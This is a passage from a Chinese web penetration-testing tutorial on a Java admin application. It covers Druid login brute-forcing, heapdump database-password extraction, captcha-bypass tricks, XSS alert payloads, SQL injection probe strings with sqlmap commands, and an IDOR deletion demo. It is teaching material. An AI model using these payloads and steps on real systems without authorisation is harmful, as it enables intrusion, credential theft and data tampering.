alt="异常信息泄露2"></p><p>也可以在请求报文中构造畸形报文，比如使用<code>@#$%!</code>等字符，或使用空格分隔路径，触发4XX或5XX错误，如下图所示：</p><p><img src="/img/%E5%BC%82%E5%B8%B8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-%E6%9E%84%E9%80%A0%E7%95%B8%E5%BD%A2%E6%8A%A5%E6%96%87.jpg" alt="异常信息泄露-构造畸形报文"></p><ul><li>Tomcat版本号泄露</li></ul><p>如果没有设置统一的报错回显页面，使用服务器默认的报错回显页面，可能会有服务器版本信息。比如下图400报错页面中有Tomcat版本号信息：</p><p><img src="/img/tomcat%E7%89%88%E6%9C%AC%E5%8F%B7%E6%B3%84%E9%9C%B2.jpg" alt="tomcat版本号泄露"></p><h3 id="3-2、敏感目录之Druid登陆暴力破解"><a href="#3-2、敏感目录之Druid登陆暴力破解" class="headerlink" title="3.2、敏感目录之Druid登陆暴力破解"></a>3.2、敏感目录之Druid登陆暴力破解</h3><p>开发人员的粗心和糟糕的安全意识，会导致Druid直接暴露在公网上，并且可能存在未授权访问。尽量是将Druid放在内网，如必需暴露在公网应使用强口令。</p><p>Druid如果存在未授权访问或登陆可暴力破解，进入监控页面的话，可以查看很多敏感信息，比如session信息，SQL执行情况等等。</p><p>问题路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ip<span class="hljs-regexp">/druid/i</span>ndex.html<br></code></pre></td></tr></table></figure><p>使用常见的登陆账号<code>admin</code>，对登陆页面进行暴力破解。如下图所示：</p><p><img src="/img/druid%E7%99%BB%E5%BD%95%E7%88%86%E7%A0%B4.jpg" alt="druid登录爆破"></p><p>根据响应长度，结果不同得到正确的账号密码。如下图所示：</p><p><img src="/img/druid%E7%88%86%E7%A0%B4%E7%BB%93%E6%9E%9C1.jpg" alt="druid爆破结果1"></p><p><img src="/img/druid%E7%88%86%E7%A0%B4%E7%BB%93%E6%9E%9C2.jpg" alt="druid爆破结果2"></p><p><strong>爆破字典</strong>推荐如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">建议自己整合一份自己的弱口令字典<br><br>口令爆破字典，有键盘组合字典、拼音字典、字母与数字混合这三种类型：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/huyuanzhi2/</span>password_brute_dictionary<br><br>Web Pentesting Fuzz 字典,一个就够了：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/TheKingOfDuck/</span>fuzzDicts<br><br><span class="hljs-number">2011</span>-<span class="hljs-number">2019</span>年Top100弱口令密码字典 Top1000密码字典 服务器SSH/VPS密码字典 后台管理密码字典 数据库密码字典 子域名字典：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/k8gege/</span>PasswordDic<br><br>基于实战沉淀下的各种弱口令字典：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fuzz-security/</span>SuperWordlist<br><br>github搜索字典可获取更多。<br></code></pre></td></tr></table></figure><p>关于Druid进一步利用，推荐阅读我之前写的一篇文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">记录一次Druid未授权访问的实战应用<br>https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1771986</span><br>或搜索公众号 <span class="hljs-string">&quot;玄魂工作室&quot;</span> 后，搜索 “记录一次Druid未授权访问的实战应用”，同样可以阅读该文章。<br></code></pre></td></tr></table></figure><h3 id="3-3、敏感目录之SpringBoot-Actuator的未授权访问"><a href="#3-3、敏感目录之SpringBoot-Actuator的未授权访问" class="headerlink" title="3.3、敏感目录之SpringBoot Actuator的未授权访问"></a>3.3、敏感目录之SpringBoot Actuator的未授权访问</h3><p>在信息收集阶段，使用<code>dirsearch</code>扫描出来了<code>/actuator</code>目录，我们访问看看是什么内容，如下图所示：</p><p><img src="/img/actuator%E7%AB%AF%E7%82%B9.jpg" alt="actuator端点"></p><p>从上图可以看到，该路径泄露了springboot actuator的所有端点，每个端点都会泄露不同程度的信息泄露。</p><p>关于具体每个端点的作用，在<code>项目简介 - A7、SpringBoot Actuator简介</code>中有提及到。</p><ul><li>获取<code>/actuator/env</code>中星号（*）密码</li></ul><p>访问路径<code>/env</code>或者<code>/actuator/env</code>，搜索（*），可以看到被星号脱敏的密码，如下图所示：</p><p><img src="/img/env%E7%9A%84%E6%98%9F%E5%8F%B7.jpg" alt="env的星号"></p><p>观察上图脱敏星号地方，被脱敏的密码应该是数据库密码，我们尝试找到密码明文。</p><p><strong>利用下述该方法前提条件：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">GET请求可正常访问目标 <span class="hljs-regexp">/heapdump 或 /</span>actuator/heapdump <br></code></pre></td></tr></table></figure><p><code>heapdump</code>端点：用于获取应用的 JVM Heap Dump（堆转储文件）</p><p>①、首先访问<code>/heapdump</code>或<code>/actuator/heapdump </code>端点，下载heapdump文件，如下图所示：</p><p><img src="/img/heapdump%E4%B8%8B%E8%BD%BD.jpg" alt="heapdump下载"></p><p>②、下载<code>Memory Analyzer</code>工具：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">该工具需要最低Java11版本<br>https:<span class="hljs-regexp">//</span>www.eclipse.org<span class="hljs-regexp">/mat/</span>downloads.php<br></code></pre></td></tr></table></figure><p>③、双击打开<code>Memory Analyzer</code>工具，点击左上侧<code>File -&gt; Open Heap Dump...</code>，选择打开下载下来的heapdump文件，如下图所示：</p><p><img src="/img/%E6%89%93%E5%BC%80heapdump.jpg" alt="打开heapdump"></p><p>④、等待分析后，默认点击Finish即可</p><p>⑤、点击<code>OQL</code>，输入以下命令后，点击红色感叹号执行，如下图所示：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> java.util.Hashtable$Entry x <span class="hljs-keyword">WHERE</span> (<span class="hljs-built_in">toString</span>(x.<span class="hljs-keyword">key</span>).<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;password&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/heapdump%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81.jpg" alt="heapdump数据库密码"></p><p>从上图可以看到获取到了数据库密码。</p><p>其他获取星号脱敏密码方式，推荐学习：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//github.com/LandGrey/SpringBootVulExploit<span class="hljs-variable">#0</span><span class="hljs-keyword">x</span><span class="hljs-number">03</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%8</span>E<span class="hljs-variable">%B7</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%96</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%98</span><span class="hljs-variable">%9</span>F<span class="hljs-variable">%E5</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%B7</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%84</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%95</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%E7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%84</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%86</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%81</span><span class="hljs-variable">%E7</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%84</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%98</span><span class="hljs-variable">%8</span>E<span class="hljs-variable">%E6</span><span class="hljs-variable">%96</span><span class="hljs-variable">%87</span>-<span class="hljs-variable">%E6</span><span class="hljs-variable">%96</span><span class="hljs-variable">%B9</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%B3</span><span class="hljs-variable">%95</span><span class="hljs-variable">%E4</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%80</span><br></code></pre></td></tr></table></figure><h3 id="3-4、敏感目录之Swagger接口文档泄露"><a href="#3-4、敏感目录之Swagger接口文档泄露" class="headerlink" title="3.4、敏感目录之Swagger接口文档泄露"></a>3.4、敏感目录之Swagger接口文档泄露</h3><p>Swagger接口文档泄露，也就会导致所有的后端接口暴露出来，造成巨大的风险。毕竟每个接口都有详细说明，并且可以直接在线调试。</p><p>在dirsearch扫描敏感目录环境，发现了几个有关swagger的路径，访问结果如下图所示：</p><p><img src="/img/swagger%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A31.jpg" alt="swagger接口文档1"></p><p>所有的接口都暴露出来了，可以直接进行漏洞挖掘了。即使不进入后台，也是可以正常进行漏洞挖掘。但以实际情况来说，涉及的接口大多也是需要身份认证与授权。但也不要放弃，将所有接口都试试，也许会发现被忽略的地方。</p><ul><li>调试接口</li></ul><p>选择某个接口，点击<code>Try it out</code>，如下图所示：</p><p><img src="/img/%E8%B0%83%E8%AF%95%E6%8E%A5%E5%8F%A31.jpg" alt="调试接口1"></p><p>然后填写必要参数后，点击<code>excute</code>执行，如下图所示：</p><p><img src="/img/%E6%8E%A5%E5%8F%A3%E8%B0%83%E8%AF%95.jpg" alt="接口调试"></p><p>上面也说到了，有些接口是需要认证授权才可以进一步操作的，但并不影响我们进行测试，基于此我们可以挖掘未授权相关的漏洞。对于每一个接口都看仔细一些，是否全都需要认证授权。</p><p>漏洞挖掘方向就是常规的手法，比如：越权，未授权访问，sql注入，如果存在文件上传&#x2F;下载功能，也尝试任意文件下载&#x2F;上传，具体需要根据实际功能分析。</p><h3 id="3-5、登录暴力破解之绕过图形验证码小技巧"><a href="#3-5、登录暴力破解之绕过图形验证码小技巧" class="headerlink" title="3.5、登录暴力破解之绕过图形验证码小技巧"></a>3.5、登录暴力破解之绕过图形验证码小技巧</h3><p>进行完前置信息收集，我们该进入后台进行一番探索了。奈何需要登录，那我们也一展神通，攻破一下登录。</p><p>经过简单分析，没有登录信息泄露，比如：<code>密码错误</code>，<code>账号错误</code>。</p><p>这些关键词的提示，可以让我们准确了解到登录账号对错。但是我们测试的系统错误提示为<code>用户名或密码错误</code>。</p><p>这种情况，我们采用常用账号名与弱口令进行交叉爆破。刨除这种方式，我们还可以通过搜索引擎，通过社工来获取登录账号。</p><p>另外，我们发现登录处还有图形验证码。首先尝试进行图形验证码绕过操作，或者使用脚本识别图形验证码，进而进行登录爆破。</p><ul><li>绕过图形验证码</li></ul><p>几个小技巧</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>、重复发送数据包，观察图形验证码是否可重复利用<br><span class="hljs-attribute">2</span>、如果登录报错会有弹框提示，在不关闭弹窗情况下，在burp中重复发送数据包<br><span class="hljs-attribute">3</span>、删除图形验证码参数<br><span class="hljs-attribute">4</span>、将图形验证码参数值置空<br><span class="hljs-attribute">5</span>、使用万能验证码，比如：<span class="hljs-number">000000</span>,<span class="hljs-number">666666</span><br><span class="hljs-attribute">6</span>、多刷新几次验证码观察是否是重复的几个<br><span class="hljs-attribute">7</span>、观察图形验证码是否返回到前端<br><span class="hljs-attribute">8</span>、记住图形验证码，在前端文件中进行搜索<br><span class="hljs-attribute">9</span>、前端进行的图形验证码认证，实际没向后端发送验证<br><span class="hljs-attribute">10</span>、删除cookie<br><span class="hljs-attribute">10</span>、等等，思路决定出路，多尝试，多观察<br></code></pre></td></tr></table></figure><p>经过上述测试，发现<code>图形验证码可重复利用</code>，或者说图形验证码判断逻辑仅检测了图形验证码是否为空（这是结合了代码审计得出的结果，在实际中也要学会去揣测）。</p><p>随便输入几个字符，在分析时发现前端验证了图形验证码的位数，而实际发现后端并没有验证，但这并不影响我们。如下图所示：</p><p><img src="/img/%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87.jpg" alt="图形验证码绕过"></p><ul><li>登录爆破</li></ul><p>经过图形验证码分析，我们发现图形验证码可重复利用，或者说图形验证码参数仅判断了是否为空。不必纠结是哪种，没有图形验证码的限制，我们可以进一步进行登录爆破了。</p><p>我们已知登录账号为<code>admin</code>。</p><p>①、将登录数据包发送到<code>Intruder</code>模块进行爆破，右键选择<code>Send to Intruder</code>，或者使用快捷键<code>ctrl+i</code>。</p><p>②、在Intruder模块设置密码变量，如下图所示：</p><p><img src="/img/Intruder%E7%88%86%E7%A0%B4.jpg" alt="Intruder爆破"></p><p>③、选择完变量后，我们将弱口令加入<code>Payloads</code>，进行爆破，如下图所示：</p><p><img src="/img/intruder%E8%AE%BE%E7%BD%AEpayload.jpg" alt="intruder设置payload"></p><p>④、点击<code>Start attack</code>，开始进行爆破，稍等一会，我们观察结果，如下图所示：</p><p><img src="/img/intruder%E7%88%86%E7%A0%B4%E7%BB%93%E6%9E%9C1.jpg" alt="intruder爆破结果1"></p><p><img src="/img/intruder%E7%88%86%E7%A0%B4%E7%BB%93%E6%9E%9C2.jpg" alt="intruder爆破结果2"></p><p>使用弱口令进行爆破，我们首先通过观察响应长度不同来初步确定密码，在通过观察响应内容，或手工尝试登录来确定账号密码。</p><p>弱口令字典碰撞实际效果不太好，需要根据目标进行定制化构造字典。并且要有意识收集常见的弱口令，或者说账号密码。</p><p>Github搜索关键字：爆破字典，弱口令，字典等等</p><h3 id="3-6、XSS漏洞挖掘"><a href="#3-6、XSS漏洞挖掘" class="headerlink" title="3.6、XSS漏洞挖掘"></a>3.6、XSS漏洞挖掘</h3><ul><li>什么是XSS漏洞</li></ul><p>XSS是跨站脚本攻击(Cross Site  Scripting)的简写，为了不与层叠样式表混淆而改写的。攻击者可以利用XSS窃取账号，网页挂马，发动拒绝服务攻击，发送垃圾邮件等等。</p><p>XSS漏洞有三种形式，<code>反射型XSS</code>，<code>DOM型XSS</code>，<code>存储型XSS</code>。</p><p><code>反射型XSS</code>：直接将输入的攻击语句返回在前端页面，不经过数据库。</p><p><code>DOM型XSS</code>：操作DOM节点直接将攻击的语句返回在前端页面，同样不经过数据库。</p><p><code>存储型XSS</code>：攻击语句被存储在数据库中，每次调用该页面都会触发XSS攻击语句。</p><ul><li>XSS靶场练习</li></ul><p>推荐经典XSS靶场进行练习，掌握基础，才有突破。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>xss-quiz.int21h.jp/<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/lyshark/</span>xss-labs<br></code></pre></td></tr></table></figure><ul><li>XSS漏洞挖掘</li></ul><p>手工挖掘，针对每个输入框，或者有输入回显的地方构造攻击语句，进行漏洞挖掘，观察回显结果。</p><p>前端或后端代码中对XSS特殊字符进行了转义&#x2F;过滤。我们只能一点点通过手工构造攻击语句观察响应结果。</p><p>自动化核心大多采用模糊测试进行漏洞挖掘。比如使用工具<code>xray</code>的xss检测，<code>XSSer</code>，<code>XSSFORK</code>……</p><p>手工测试几个XSS弹框语句：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span> /&gt;</span><br>&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br>javascript:alert(1)<br>&#x27;-alert(1)-&#x27;<br><span class="hljs-tag">&lt;<span class="hljs-name">x</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br>......<br></code></pre></td></tr></table></figure><p>①、登录到后台，寻找输入框进行XSS攻击，经过针对每一个输入框，每一个表单测试后发现系统内存在多处XSS漏洞。</p><p>②、举个例子，访问<code>系统管理 -&gt; 用户管理</code>，点击新增，在角色名和角色描述中输入XSS攻击语句，如下图所示：</p><p><img src="/img/%E8%A7%92%E8%89%B2%E6%96%B0%E5%A2%9EXSS.jpg" alt="角色新增XSS"></p><p>③、点击提交后，观察响应，发现前端发生了弹框行为，如下图所示：</p><p><img src="/img/%E8%A7%92%E8%89%B2%E6%96%B0%E5%A2%9Exss%E5%BC%B9%E6%A1%86.jpg" alt="角色新增xss弹框"></p><p>上述功能插入的XSS攻击语句被保存在了数据库，每当你访问该页面时都会有弹框行为。</p><p>④、发现<code>系统监控 -&gt; 操作日志</code>中也触发了XSS漏洞，也就是如果后台存在日志记录，且没对XSS攻击语句进行过滤&#x2F;转义的话，也会出现XSS漏洞。</p><p>或许以后在挖掘XSS漏洞时，我们应该多注意些什么呢。</p><p><img src="/img/XSS%E6%93%8D%E4%BD%9C%E6%97%A5%E5%BF%97%E5%BC%B9%E6%A1%86.jpg" alt="XSS操作日志弹框"></p><h3 id="3-7、SQL注入漏洞挖掘"><a href="#3-7、SQL注入漏洞挖掘" class="headerlink" title="3.7、SQL注入漏洞挖掘"></a>3.7、SQL注入漏洞挖掘</h3><ul><li>什么是SQL注入漏洞</li></ul><p>SQL注入主要发生在与数据库交互的地方，前端将数据传入后端后进行了数据库相关操作。如果我们传入的数据没有有被过滤，拼接到SQL中，被当成SQL语句执行，那么我们可以构造攻击语句，进而可以操作数据库。</p><p><strong>SQL几种注入模式：</strong></p><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li><li>联合查询注入，可以使用 union 的情况下的注入；</li><li>堆查询注入，可以同时执行多条语句的执行时的注入</li></ol><p>对于不同数据库，攻击语句不同。常见的数据库有<code>Mysql</code>，<code>Oracle</code>，<code>SQL Server</code>等等。</p><p><strong>SQL注入必练靶场：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">SQLi-labs：<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Audi-1/</span>sqli-labs<br></code></pre></td></tr></table></figure><ul><li>SQL注入漏洞挖掘</li></ul><p>SQL注入漏洞挖掘第一步是找与数据库交互的地方，也所谓的<code>注入点</code>。</p><p><strong>手工挖掘，初步判断：</strong></p><p>针对每个与数据库交互的点，使用下述攻击POC，观察响应，进行初步判断。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 1c">‘<br>’ and &#x27;1&#x27;=&#x27;1<br>&#x27; or &#x27;1&#x27;=&#x27;1<br>’ and &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">2</span><br>&#x27; or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">2</span><br>&#x27; and\u<span class="hljs-number">0020</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br>&#x27; and\u<span class="hljs-number">0020</span>&#x27;%&#x27;=&#x27;<br>&#x27; or\u<span class="hljs-number">0020</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br>&#x27; and\u<span class="hljs-number">0020</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">2</span><br>&#x27; or\u<span class="hljs-number">0020</span>length(user)=3 or\u<span class="hljs-number">0020</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br>&#x27; or\u<span class="hljs-number">0020</span>length(user)=2 or\u<span class="hljs-number">0020</span>&#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br><br>更多探测语句，可收集相关字典。<br></code></pre></td></tr></table></figure><p><strong>自动化挖掘：</strong></p><p>使用SQL注入神器<code>SQLmap</code>，官方地址：<code>https://sqlmap.org/</code></p><p>SQLMap 是一个开源的渗透测试工具，可以用来进行自动化检测，利用 SQL 注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p><p>使用SQLmap对每个与数据交互的点都进行SQL注入探测。</p><p>经过一番探测，发现<code>系统管理 -&gt; 用户管理 -&gt; 查询</code>和<code>系统管理 -&gt; 字典管理 -&gt; 查询</code>两处存在SQL注入。以其中一个为例进行演示。</p><p>①、访问<code>系统管理 -&gt; 用户管理 -&gt; 查询</code>功能，输入关键字，点击查询，此时使用Burp抓取数据包，如下图所示：</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5%E6%8A%93%E5%8C%851.jpg" alt="sql注入抓包1"></p><p>②、在桌面新建文本文件<code>r.txt</code>，并将抓取到的数据包复制进去，如下图所示：</p><p><img src="/img/sqlmap%E6%B3%A8%E5%85%A5rtxt.jpg" alt="sqlmap注入rtxt"></p><p>③、开启命令行，进入sqlmap文件夹，输入命令<code>py -3 sqlmap.py -r xxxxx</code>，回车进行sql注入漏洞探测，如果需要输入选项，敲击回车默认即可，如下图所示：</p><p><img src="/img/sqlmap-r.jpg" alt="sqlmap-r"></p><p>④、等待一段一时间，经过探测，发现<code>nickName</code>参数存在SQL注入漏洞，如下图所示：</p><p><img src="/img/nicknameSQL%E6%B3%A8%E5%85%A5.jpg" alt="nicknameSQL注入"></p><p>⑤、使用sqlmap获取当前数据库，命令<code>py -3 sqlmap.py -r 绝对路径\r.txt --dbs</code>，如下图所示：</p><p><img src="/img/sqlmap%E8%8E%B7%E5%8F%96dbs.jpg" alt="sqlmap获取dbs"></p><p>⑥、sqlmap获取数据库表信息，命令<code>py -3 sqlmap.py -r xxx\r.txt -D information_schema --tables</code>，如下图所示：</p><p><img src="/img/sqlmap%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%BF%A1%E6%81%AF.jpg" alt="sqlmap获取表信息"></p><h3 id="3-8、越权漏洞挖掘"><a href="#3-8、越权漏洞挖掘" class="headerlink" title="3.8、越权漏洞挖掘"></a>3.8、越权漏洞挖掘</h3><ul><li>什么是越权漏洞</li></ul><p>越权，顾名思义，是超越权限或权力范围的意思。越权漏洞也就是超越该账户权限操作其他账号。比如：越权获取敏感信息、越权删除他人订单、越权添加管理账号等等。</p><p>越权漏洞主要形成原因为在<code>对数据进行增删改查时没有进行权限的判定</code>，或验证权限不充分，从而导致越权漏洞的出现。</p><p><strong>水平越权</strong>：同权限下账号数据的越权读取&#x2F;操作。</p><p><strong>垂直越权</strong>：不同权限下账号数据的越权读取&#x2F;操作。比如：普通用户越权操作&#x2F;读取了管理员数据。</p><p>挖掘越权漏洞前置条件最好是准备<code>两个账号</code>。对于水平越权准备两个<code>同权限</code>账号。对于垂直越权准备两个<code>不同权限</code>账号。</p><p>除非是自己搭建环境或者是授权的渗透测试项目，否则不建议通过遍历ID方式来测试越权漏洞。</p><ul><li>越权漏洞手工挖掘</li></ul><p>手工漏洞挖掘漏洞比较耗时耗力，但优点在于可以对所有流程有更深入的了解，可以发现更深层问题。</p><p>经过深入的手工挖掘，发现系统中存在越权漏洞。详细步骤如下。</p><p>①、登录<code>admin</code>账号，访问<code>系统管理 -&gt; 用户管理</code>，点击<code>新增</code>，添加越权测试用的账号，如下图所示：</p><p><img src="/img/%E6%B7%BB%E5%8A%A0%E8%B6%8A%E6%9D%83%E8%B4%A6%E5%8F%B7.jpg" alt="添加越权账号"></p><p>②、点击提交后，退出admin账号，登录<code>yuequan</code>账号，初始密码为<code>123456</code>，访问<code>系统管理 -&gt; 用户管理</code>，随便添加个账号，对比<code>admin</code>和<code>yuequan</code>两个账号数据，如下图所示：</p><p><img src="/img/%E8%B6%8A%E6%9D%83%E8%B4%A6%E5%8F%B7%E6%95%B0%E6%8D%AE.jpg" alt="越权账号数据"></p><p><img src="/img/admin%E8%B4%A6%E5%8F%B7%E6%95%B0%E6%8D%AE.jpg" alt="admin账号数据"></p><p>③、通过访问两个不同权限账号下的用户管理，观察到两个账号的用户数据不同。<code>admin</code>账号下的用户管理包括了所有的用户信息，<code>yuequan</code>账号下仅能看到自己新添加的<code>yuequan1</code>的账号。我们进一步验证越权漏洞。登录<code>admin</code>账号，访问用户管理功能，选择一个不存在于<code>yuequan</code>账号下的账号数据。通过上图对比，选择<code>test4</code>为例。</p><p>④、此时浏览器打开代理连接到Burp，Burp下的Proxy打开<code>Intercept on</code>，然后点击删除<code>test4</code>，此时Burp抓取到删除的数据包，记录<code>userId</code>参数，将数据包发送到<code>Repeater</code>模块，最后将数据包<code>Drop</code>掉，我们不做删除操作。如下图所示：</p><p><img src="/img/%E8%AE%B0%E5%BD%95userid.jpg" alt="记录userid"></p><p>⑤、退出admin账号，登录yuequan账号后，访问用户管理功能，点击删除某个账号，此时同样开始Burp拦截数据包，发送到<code>Repeater模块</code>，并将<code>userId</code>替换成<code>6</code>后，点击<code>Send</code>发送数据包，提示<code>删除用户成功</code>，如下图所示：</p><p><img src="/img/%E8%B6%8A%E6%9D%83%E5%88%A0%E9%99%A4%E8%B4%A6%E5%8F%B7.jpg" alt="越权删除账号"></p><p>⑥、最后登录admin账号，进一步验证<code>test4</code>账号被越权删除，如下图所示：</p><p><img src="/img/%E8%B6%8A%E6%9D%83%E5%88%A0%E9%99%A4test4%E8%B4%A6%E5%8F%B7.jpg" alt="越权删除test4账号"></p><p>上述操作，我们可以采用两种方式来进行验证。一是通过替换cookie，二是通过修改userid，这两者的意义是一样的。</p><ul><li>越权漏洞自动化挖掘</li></ul><p>工具推荐BurpSuite插件<code>Autorize</code>。官方地址：<code>     https://github.com/portswigger/autorize </code>，可通过BurpSuite的<code>Extender-BApp Store</code>安装。</p><p>安装<code>Autorize</code>之前需要先安装<code>Jython</code>环境，下载地址：<code>https://www.jython.org/download.html</code>。安装教程可自行搜索。</p><p>①、登录<code>yuequan账号</code>，记录cookie值，并将该值导入到<code>Autorize</code>模块，规则配置如下图所示：</p><p><img src="/img/atuorize%E7%BC%96%E5%86%99%E8%A7%84%E5%88%99.jpg" alt="atuorize编写规则"></p><p>②、然后登录到<code>admin</code>账号，对各个功能进行点击操作，即可看到测试结果。有三个测试结果<code>Bypassed - 红色标记：不存在</code>，<code>Enforced - 绿色标记：存在</code>，<code>Is enforced??? - 黄色标记：不确定是否存在越权漏洞，需要手工验证</code>。扫描结果如下图所示：</p><p><img src="/img/autorize%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.jpg" alt="autorize扫描结果"></p><p>注意：上述仅为演示，过滤规则不是最优，可根据实际项目场景，进行构造。</p><p>举一反三，后台系统一些功能点还存在相关问题，比如<code>角色管理</code>，<code>部门管理</code>等等。思考一下问题会出在哪里，再配合使用自动化工具，赶紧动手试试吧。</p><p>另外，我们通过挖掘越权漏洞时发现，低权限在用户管理处添加的账号，admin账号也能看到。那么配合XSS漏洞，是不是能做些什么骚操作呢？</p><h2 id="四、项目介绍"><a href="#四、项目介绍" class="headerlink" title="四、项目介绍"></a>四、项目介绍</h2><h4 id="4-1、Java的MVC模式"><a href="#4-1、Java的MVC模式" class="headerlink" title="4.1、Java的MVC模式"></a>4.1、Java的MVC模式</h4><p>MVC 模式是一种软件框架模式，被广泛应用在 JavaEE 项目的开发中。</p><p>MVC 即模型（Model） 、视图（View）、控制器（Controller）。</p><ul><li>模型（Model）</li></ul><p>模型是用于处理数据逻辑的部分。</p><p>所谓数据逻辑，也就是数据的映射以及对数据的增删改查，Bean、DAO（data access object，数据访问对象）等都属于模型部分。</p><ul><li>视图（View）</li></ul><p>视图负责数据与其它信息的显示，也就是给用户看到的页面。</p><p>html、JSP 